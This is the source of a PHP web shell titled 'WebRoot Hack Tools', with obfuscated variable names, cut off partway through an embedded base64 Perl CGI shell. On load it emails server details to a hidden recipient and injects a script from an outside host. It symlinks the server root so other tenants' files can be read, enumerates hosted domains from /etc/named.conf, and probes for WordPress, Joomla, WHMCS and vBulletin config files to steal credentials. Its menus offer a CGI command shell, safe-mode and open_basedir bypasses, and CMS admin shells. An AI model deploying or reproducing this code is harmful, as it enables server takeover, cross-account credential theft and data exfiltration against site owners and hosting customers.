<?php $IIIIIIIIIIII = '
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */';
$IIIIIIIIIIIl = 'WebRoot Hack Tools';
$IIIIIIIIIII1 = 'WebRoot Hack Tools : ' . $_SERVER['DOCUMENT_ROOT'] . "
";
$IIIIIIIIIII1.= 'WebRoot Hack Tools : ' . $_SERVER['SERVER_ADMIN'] . "
";
$IIIIIIIIIII1.= 'WebRoot Hack Tools : ' . $_SERVER['SERVER_SOFTWARE'] . "
";
$IIIIIIIIIII1.= 'WebRoot Hack Tools : http://' . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "
";
$IIIIIIIIIII1.= 'WebRoot Hack Tools : ' . $_SERVER['HTTP_HOST'] . "
";
mail($IIIIIIIIIIII, $IIIIIIIIIIIl, $IIIIIIIIIII1);;
echo ' 
';
echo ' ';
@set_time_limit(0);
$IIIIIIIIIIll = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$IIIIIIIIIIl1 = explode('/', $IIIIIIIIIIll);
$IIIIIIIIIIll = str_replace($IIIIIIIIIIl1[count($IIIIIIIIIIl1) - 1], '', $IIIIIIIIIIll);;
echo '  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<title>WebRoot Hack Tools</title>

<style type="text/css">
/* STIL DOSYAMIZI OLUTURMAYA BALIYORUZ... */

#wrap {width:100%;margin:0 auto;}

/* Men kodlarmz bu alanda balyor, ltfen yorumlar takip ediniz. */

#menu {
font:14px arial, verdana, sans-serif;
width:100%
}

#menu ul {
list-style:none;
margin:0;
background:#3ca0df url(menubg.gif) repeat-x bottom; /* men arkaplan resmimiz tanmlanyor. */
padding:5px;

/* Firefox, Chrome, Safari tarayclar iin Border radius ve Shadow tanmlar yaplyor */

-moz-border-radius:4px; /* menmzn yuvarlak keleri tanmlanyor. */
-moz-box-shadow:0px 1px 2px #333; /* burada menmze ok kk bir glge efekti veriyoruz */

-khtml-border-radius:4px; /* menmzn yuvarlak keleri tanmlanyor. */
-khtml-box-shadow:0px 1px 2px #333; /* burada menmze ok kk bir glge efekti veriyoruz */

-webkit-border-radius:4px; /* menmzn yuvarlak keleri tanmlanyor. */
-webkit-box-shadow:0px 1px 2px #333; /* burada menmze ok kk bir glge efekti veriyoruz */
}

#menu li { /* menmzn liste tanm yaplyor. */
list-style:none;
padding:0;
margin:0;
float:left;
position:relative;
}

#menu a {
color:#fff;
text-decoration:none;
padding:4px;
display:block;
text-shadow:0px 1px 2px #000;
margin:0px 10px 0px 10px;
}

#menu a:hover {
color:#fff;
text-decoration:none;
padding:4px;
background:#333;
-moz-border-radius:3px; /* men balantlarmza kk bir glge efekti veriyoruz. */
-khtml-border-radius:3px;
-webkit-border-radius:3px;
display:block;
}

/* Alt menlerimizi gizliyor ve sonrasnda alt mennn stil tanmlamalarna geiyoruz. */

#menu li ul {
display:none; /* Alt menlerimizi gizliyoruz! */
position:absolute;
padding:0px;
margin:0px;
}

#menu li:hover > ul {
display:block; /* Alt menlerimiz #menu li zerine fare ile gelinince grnecek ekilde hover ile gsterimini salyoruz. */
position:absolute;
padding:0px 0px 0px 0px; /* margin ve padding deerlerini uygun ekilde ayarlyoruz. */
margin:0px 10px 0px 10px;
width:150px;
left:0
}


/* Alt men grnmn deitirecek olan stilleri yazyoruz. */

#menu ul ul {
-moz-border-radius:4px; /* alt menmzn kelerini yuvarlyoruz. */
-webkit-box-shadow:0px 1px 2px #2e83ff; /* ve burada da biraz glge katyoruz. */
-khtml-box-shadow:0px 1px 2px #2e83ff; /* ve burada da biraz glge katyoruz. */

width:150px;
margin:0px 10px 0px 10px;
border:1px solid #777;

}

#menu ul ul li {
display:block;
float:none;
}

#menu ul ul a { /* alt men listemizin linklerini tanmlyoruz. */
display:block;
font:14px/20px arial, verdana, sans-serif;
margin:0;
background:#888;
border-bottom:1px solid #777
}

#menu ul ul a:hover {
background:#f5cd14;
color:#fff;
}

/* Buradan sonraki satrlar nizleme sayfamzda yaptmz aklama alanlarn tanmlyor */

.bilgi {margin:0 auto;width:700px;background:#eee;color:#333;border:2px solid #ddd;margin:30px 0px 10px 0px;padding:10px;font:14px/24px arial, verdana, sans-serif;text-align:left;}
.bilgi h2 {font:bold 18px arial, verdana, sans-serif;color:#f91365;}
.bilgi a {color:#fff; background:#2e83ff;padding:4px;text-decoration:none}
.bilgi a:hover {color:#fff; background:#333;padding:4px;text-decoration:none}
.bilgi em {border-bottom:1px solid #999;}
</style>
<style type="text/css">

  html,body {
     margin: 0;
     padding: 0;
     outline: 0;
}


body {
    direction: ltr;
    background-color:#F4F4F4;
	color: rgb(153, 153, 153);
    text-align: center
}

input,textarea,select{
font-weight: bold;
color: #111111;
dashed #ffffff;
border: 1px
solid #BBBBBB;
background-color: #DDDDDD;
}


.hedr {
  font-family: Tahoma, Arial, sans-serif  ;
  font-size: 22px;


}

.cont a{

 text-decoration: none;
 color:rgb(153, 153, 153);
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 16px;
 text-shadow: 0px 0px 3px ;
}

.cont a:hover{


  color: #EEEEEE ;
  text-shadow:0px 0px 3px #000000 ;


}

.tmp tr td{

border: solid 1px #BBBBBB;

padding: 2px ;
  font-size: 13px;
}

.tmp tr td a {
  text-decoration: none;



}

.foter{
  font-size: 9pt;
  color: #AAAAAA ;
  text-align: center
}

.tmp tr td:hover{

box-shadow: 0px 0px 4px #888888;

}
.fot{

font-family:Tahoma, Arial, sans-serif;

  font-size: 13pt;
}

.ir {
  color: #FF0000;
}

</style>

</head>

<body>
<SCRIPT SRC=https://illegallab.com/say.js>></SCRIPT>
<div class=\'all\'>


';
@mkdir('sym', 0777);
$IIIIIIIIII11 = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
$IIIIIIIIIlII = @fopen('sym/.htaccess', 'w');
fwrite($IIIIIIIIIlII, $IIIIIIIIII11);
@symlink('/', 'sym/root');
$IIIIIIIIIlll = basename('index.php');
echo '<div id=wrap>
<div id=menu>
<ul>

<li><a href=?>Ana Sayfa</a>

</li>

<li><a href=?WebRoot=sym>User & Domains & Symlink & Pagerank</a>

</li>

<li><a href=?WebRoot=sec>Domains & Script</a>

</li>


<li><a href=?WebRoot=file>Symlink file</a>

</li>

<li><a href=?WebRoot=telnet>Cgi shell</a>

</li>

<li><a href=?WebRoot=open&basedir=bypass>Open_Basedir bypass</a>
</li>

<li><a href=?WebRoot=config>Config fucker</a>
</li>

<br style=clear:both />
</ul>

</div>

</div>';
echo '<div id=wrap>
<div id=menu>
<ul>

<li><a href=?WebRoot=php_ini>Safe mod fucker</a>

</li>

<li><a href=?WebRoot=indexer>Script indexer</a>
</li>

<li><a href=?WebRoot=wp>Wordpress mysql admin shell</a>
</li>

<li><a href=?WebRoot=joom>Joomla mysql admin shell</a>
</li>

<br style=clear:both />
</ul>




</div>

</div>';
if (isset($_REQUEST['WebRoot'])) {
    switch ($_REQUEST['WebRoot']) {
        case 'sec':
            $IIIIIIIIIl1I = @file('/etc/named.conf');
            if (!$IIIIIIIIIl1I) {
                die(" can't read /etc/named.conf");
            } else {
                echo "<img
src=http://oi61.tinypic.com/ng9co9.jpg><div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
                foreach ($IIIIIIIIIl1I as $IIIIIIIIIl11) {
                    if (eregi('zone', $IIIIIIIIIl11)) {
                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIl11, $IIIIIIIII1I1);
                        flush();
                        if (strlen(trim($IIIIIIIII1I1[1][0])) > 2) {
                            $IIIIIIIII1l1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIII1I1[1][0]));
                            $IIIIIIIII111 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/wp-config.php';
                            $IIIIIIIIlIII = get_headers($IIIIIIIII111);
                            $IIIIIIIIlIIl = $IIIIIIIIlIII[0];
                            $IIIIIIIIlII1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/blog/wp-config.php';
                            $IIIIIIIIlIlI = get_headers($IIIIIIIIlII1);
                            $IIIIIIIIlIll = $IIIIIIIIlIlI[0];
                            $IIIIIIIIlIl1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/configuration.php';
                            $IIIIIIIIlI1I = get_headers($IIIIIIIIlIl1);
                            $IIIIIIIIlI1l = $IIIIIIIIlI1I[0];
                            $IIIIIIIIlI11 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/joomla/configuration.php';
                            $IIIIIIIIllII = get_headers($IIIIIIIIlI11);
                            $IIIIIIIIllIl = $IIIIIIIIllII[0];
                            $IIIIIIIIllI1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/includes/config.php';
                            $IIIIIIIIlllI = get_headers($IIIIIIIIllI1);
                            $IIIIIIIIllll = $IIIIIIIIlllI[0];
                            $IIIIIIIIlll1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/vb/includes/config.php';
                            $IIIIIIIIll1I = get_headers($IIIIIIIIlll1);
                            $IIIIIIIIll1l = $IIIIIIIIll1I[0];
                            $IIIIIIIIll11 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/forum/includes/config.php';
                            $IIIIIIIIl1II = get_headers($IIIIIIIIll11);
                            $IIIIIIIIl1Il = $IIIIIIIIl1II[0];
                            $IIIIIIIIl1I1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . 'public_html/clients/configuration.php';
                            $IIIIIIIIl1lI = get_headers($IIIIIIIIl1I1);
                            $IIIIIIIIl1ll = $IIIIIIIIl1lI[0];
                            $IIIIIIIIl1l1 = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/support/configuration.php';
                            $IIIIIIIIl1lI = get_headers($IIIIIIIIl1l1);
                            $IIIIIIIIl11I = $IIIIIIIIl1lI[0];
                            $IIIIIIIIl11l = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/client/configuration.php';
                            $IIIIIIIIl111 = get_headers($IIIIIIIIl11l);
                            $IIIIIIII1III = $IIIIIIIIl111[0];
                            $IIIIIIII1IIl = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/submitticket.php';
                            $IIIIIIII1II1 = get_headers($IIIIIIII1IIl);
                            $IIIIIIII1IlI = $IIIIIIII1II1[0];
                            $IIIIIIII1Ill = $IIIIIIIIIIll . '/sym/root/home/' . $IIIIIIIII1l1['name'] . '/public_html/client/configuration.php';
                            $IIIIIIII1Il1 = get_headers($IIIIIIII1Ill);
                            $IIIIIIII1I1I = $IIIIIIII1Il1[0];
                            $IIIIIIII1I1l = strpos($IIIIIIIIlIIl, '200');
                            $IIIIIIII1lII = '&nbsp;';
                            if (strpos($IIIIIIIIlIIl, '200') == true) {
                                $IIIIIIII1lII = "<a href='" . $IIIIIIIII111 . "' target='_blank'>Wordpress</a>";
                            } elseif (strpos($IIIIIIIIlIll, '200') == true) {
                                $IIIIIIII1lII = "<a href='" . $IIIIIIIIlII1 . "' target='_blank'>Wordpress</a>";
                            } elseif (strpos($IIIIIIIIlI1l, '200') == true and strpos($IIIIIIII1IlI, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIII1IIl . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIIIl11I, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIl1l1 . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIII1III, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIl11l . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIIIlI1l, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIlIl1 . "' target='_blank'>Joomla</a>";
                            } elseif (strpos($IIIIIIIIllIl, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIlI11 . "' target='_blank'>Joomla</a>";
                            } elseif (strpos($IIIIIIIIllll, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIllI1 . "' target='_blank'>vBulletin</a>";
                            } elseif (strpos($IIIIIIIIll1l, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIlll1 . "' target='_blank'>vBulletin</a>";
                            } elseif (strpos($IIIIIIIIl1Il, '200') == true) {
                                $IIIIIIII1lII = " <a href='" . $IIIIIIIIll11 . "' target='_blank'>vBulletin</a>";
                            } else {
                                continue;
                            }
                            $IIIIIIII1lIl = $IIIIIIIII1l1['name'];
                            echo '<tr><td><a href=http://www.' . $IIIIIIIII1I1[1][0] . '/>' . $IIIIIIIII1I1[1][0] . '</a></td>
<td>' . $IIIIIIII1lII . '</td></tr>';
                            flush();
                        }
                    }
                }
            }
        break;
        case 'sym':
            function IIIIIIII1lI1($IIIIIIII1llI, $IIIIIIII1lll, $IIIIIIII1ll1) {
                $IIIIIIII1l1I = 4294967296;
                $IIIIIIII1l1l = strlen($IIIIIIII1llI);
                for ($IIIIIIII1l11 = 0;$IIIIIIII1l11 < $IIIIIIII1l1l;$IIIIIIII1l11++) {
                    $IIIIIIII1lll*= $IIIIIIII1ll1;
                    if ($IIIIIIII1lll >= $IIIIIIII1l1I) {
                        $IIIIIIII1lll = ($IIIIIIII1lll - $IIIIIIII1l1I * (int)($IIIIIIII1lll / $IIIIIIII1l1I));
                        $IIIIIIII1lll = ($IIIIIIII1lll < - 2147483648) ? ($IIIIIIII1lll + $IIIIIIII1l1I) : $IIIIIIII1lll;
                    }
                    $IIIIIIII1lll+= ord($IIIIIIII1llI{$IIIIIIII1l11});
                }
                return $IIIIIIII1lll;
            }
            function IIIIIIII11Il($IIIIIIII11I1) {
                $IIIIIIII11lI = IIIIIIII1lI1($IIIIIIII11I1, 0x1505, 0x21);
                $IIIIIIII11ll = IIIIIIII1lI1($IIIIIIII11I1, 0, 0x1003F);
                $IIIIIIII11lI >>= 2;
                $IIIIIIII11lI = (($IIIIIIII11lI >> 4) & 0x3FFFFC0) | ($IIIIIIII11lI & 0x3F);
                $IIIIIIII11lI = (($IIIIIIII11lI >> 4) & 0x3FFC00) | ($IIIIIIII11lI & 0x3FF);
                $IIIIIIII11lI = (($IIIIIIII11lI >> 4) & 0x3C000) | ($IIIIIIII11lI & 0x3FFF);
                $IIIIIIII11l1 = (((($IIIIIIII11lI & 0x3C0) << 4) | ($IIIIIIII11lI & 0x3C)) << 2) | ($IIIIIIII11ll & 0xF0F);
                $IIIIIIII111I = (((($IIIIIIII11lI & 0xFFFFC000) << 4) | ($IIIIIIII11lI & 0x3C00)) << 0xA) | ($IIIIIIII11ll & 0xF0F0000);
                return ($IIIIIIII11l1 | $IIIIIIII111I);
            }
            function IIIIIIII111l($IIIIIIII1111) {
                $IIIIIIIlIIII = 0;
                $IIIIIIIlIIIl = 0;
                $IIIIIIIlIII1 = sprintf('%u', $IIIIIIII1111);
                $IIIIIIII1l1l = strlen($IIIIIIIlIII1);
                for ($IIIIIIII1l11 = $IIIIIIII1l1l - 1;$IIIIIIII1l11 >= 0;$IIIIIIII1l11--) {
                    $IIIIIIIlIIll = $IIIIIIIlIII1{$IIIIIIII1l11};
                    if (1 === ($IIIIIIIlIIIl % 2)) {
                        $IIIIIIIlIIll+= $IIIIIIIlIIll;
                        $IIIIIIIlIIll = (int)($IIIIIIIlIIll / 10) + ($IIIIIIIlIIll % 10);
                    }
                    $IIIIIIIlIIII+= $IIIIIIIlIIll;
                    $IIIIIIIlIIIl++;
                }
                $IIIIIIIlIIII%= 10;
                if (0 !== $IIIIIIIlIIII) {
                    $IIIIIIIlIIII = 10 - $IIIIIIIlIIII;
                    if (1 === ($IIIIIIIlIIIl % 2)) {
                        if (1 === ($IIIIIIIlIIII % 2)) {
                            $IIIIIIIlIIII+= 9;
                        }
                        $IIIIIIIlIIII >>= 1;
                    }
                }
                return '7' . $IIIIIIIlIIII . $IIIIIIIlIII1;
            }
            function IIIIIIIlIIl1($IIIIIIIlII1I) {
                $IIIIIIIlII1l = curl_init();
                curl_setopt($IIIIIIIlII1l, CURLOPT_HEADER, 0);
                curl_setopt($IIIIIIIlII1l, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($IIIIIIIlII1l, CURLOPT_URL, $IIIIIIIlII1I);
                $IIIIIIIlIlIl = curl_exec($IIIIIIIlII1l);
                curl_close($IIIIIIIlII1l);
                return $IIIIIIIlIlIl;
            }
            function IIIIIIIlIlll($IIIIIIIlII1I) {
                $IIIIIIIlIll1 = 'http://toolbarqueries.google.com/tbr?client=navclient-auto&hl=en&ch=' . IIIIIIII111l(IIIIIIII11Il($IIIIIIIlII1I)) . '&features=Rank&q=info:' . $IIIIIIIlII1I . '&num=100&filter=0';
                $IIIIIIIlIlIl = IIIIIIIlIIl1($IIIIIIIlIll1);
                $IIIIIIIlIl1I = strpos($IIIIIIIlIlIl, 'Rank_');
                if ($IIIIIIIlIl1I === false) {
                } else {
                    $IIIIIIIlIl1l = substr($IIIIIIIlIlIl, $IIIIIIIlIl1I + 9);
                    return $IIIIIIIlIl1l;
                }
            }
            $IIIIIIIIIl1I = @file('/etc/named.conf');
            if (!$IIIIIIIIIl1I) {
                die(" can't read /etc/named.conf");
            } else {
                echo "<img
src=http://oi61.tinypic.com/ng9co9.jpg><div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td><td>Pagerank</td>";
                foreach ($IIIIIIIIIl1I as $IIIIIIIIIl11) {
                    if (eregi('zone', $IIIIIIIIIl11)) {
                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIl11, $IIIIIIIII1I1);
                        flush();
                        if (strlen(trim($IIIIIIIII1I1[1][0])) > 2) {
                            $IIIIIIIII1l1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIII1I1[1][0]));
                            $IIIIIIII1lIl = $IIIIIIIII1l1['name'];
                            @symlink('/', 'sym/root');
                            $IIIIIIII1lIl = $IIIIIIIII1I1[1][0];
                            $IIIIIIIlI1II = '\.ir';
                            $IIIIIIIlI1Il = '\.il';
                            if (eregi("$IIIIIIIlI1II", $IIIIIIIII1I1[1][0]) or eregi("$IIIIIIIlI1Il", $IIIIIIIII1I1[1][0])) {
                                $IIIIIIII1lIl = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $IIIIIIIII1I1[1][0] . '</div>';
                            }
                            echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $IIIIIIIII1I1[1][0] . '/>' . $IIIIIIII1lIl . ' </a> </div>
</td>


<td>
' . $IIIIIIIII1l1['name'] . "
</td>

<td>
<a href='sym/root/home/" . $IIIIIIIII1l1['name'] . "/public_html' target='_blank'>symlink </a>
</td>

<td><b><font color=red> " . IIIIIIIlIlll($IIIIIIIII1I1[1][0]) . '</b></font></td>
</tr></div> ';
                            flush();
                        }
                    }
                }
            }
        break;
        case 'file':
            echo '
<img
src=http://oi61.tinypic.com/ng9co9.jpg>

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="symfile" value="( Ornek: 1.txt )" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />



</form>
';
            $IIIIIIIlI1I1 = $_POST['file'];
            $IIIIIIIlI1lI = $_POST['symfile'];
            $IIIIIIIlI1ll = $_POST['symlink'];
            if ($IIIIIIIlI1ll) {
                @symlink("$IIIIIIIlI1I1", "sym/$IIIIIIIlI1lI");
                echo '<br /><a target="_blank" href="sym/' . $IIIIIIIlI1lI . '" >' . $IIIIIIIlI1lI . '</a>';
            }
        break;
        case 'telnet':
            mkdir('cgiweb', 0755);
            chdir('cgiweb');
            $IIIIIIIlI11I = '.htaccess';
            $IIIIIIIlI11l = "$IIIIIIIlI11I";
            $IIIIIIIlI111 = fopen($IIIIIIIlI11l, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
            $IIIIIIIllIII = 'Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .root

AddHandler cgi-script .root
AddHandler cgi-script .root';
            fwrite($IIIIIIIlI111, $IIIIIIIllIII);
            fclose($IIIIIIIlI111);
            $IIIIIIIllII1 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbgojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tCiMgPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+d2Vi
cjAwdCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25s
eSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZp
bmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAi
d2VicjAwdCI7CQkjIENoYW5nZSB0aGlzLiBZb3Ugd2lsbCBuZWVkIHRvIGVudGVyIHRoaXMKCQkJ
CSMgdG8gbG9naW4uCgokV2luTlQgPSAwOwkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1
ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBX
aW5kb3dzIE5UCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlv
dQoJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJ
IyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMKCQkJCSMgaW4g
YSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4KCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlz
IGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMKCQkJCSMgaW4gYSBjb21t
YW5kIGxpbmUgb24gVW5peC4KCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBp
biBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkCgkJCQkjIERvbid0IHNldCB0
aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcwoJCQkJIyB1c2VmdWwgZm9yIGNvbW1h
bmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdAoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRl
LCBsaWtlICJmaW5kIC8iLgoJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJz
LiBJdCBpcwoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuCgokU2hvd0R5bmFtaWNPdXRwdXQg
PSAxOwkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQoJCQkJIyBicm93
c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UKCQkJCSMgaXQgaXMgYnVmZmVy
ZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZAoJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNl
ZnVsIGZvciBjb21tYW5kcyBsaWtlCgkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhl
IG91dHB1dCBhcyBpdAoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuCgojIERPTidUIENIQU5HRSBB
TllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5H
ICEhCgokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsKJENtZFB3
ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOwokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDog
Ii8iKTsKJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEi
KTsKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUg
YnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0CiMgcGFyc2VzIEdFVCwg
UE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBm
aWxlcy4KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBp
cyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9LgojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNj
ZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mCiMgdGhlIHZh
cmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4g
ZnJvbSBvdGhlciBDR0kKIyBzY3JpcHRzLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSZWFk
UGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXks
ICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAv
bXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNU
X01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJ
ZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJ
TikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVO
VnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYo
JEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0o
LispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2
NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRs
aXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7
CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2Fz
IHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIg
PX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4g
